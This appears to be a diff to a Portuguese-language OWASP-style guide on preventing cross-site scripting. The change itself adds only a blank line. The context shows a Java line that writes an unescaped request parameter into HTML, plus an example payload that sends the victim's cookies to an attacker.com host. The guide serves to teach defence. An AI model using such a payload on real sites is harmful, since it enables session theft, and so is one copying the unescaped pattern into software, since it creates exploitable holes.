@@ -30,6 +30,7 @@ Prevenir XSS requer a separação de dados não confiáveis do conteúdo ativo d
 **Cenário 1**: A aplicação usa dados não confiáveis na construção do seguinte fragmento HTML sem validação ou *escaping*:
 
 `(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`
+
 O atacante modifica o parâmetro 'CC' no navegador para:
 
 `'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`
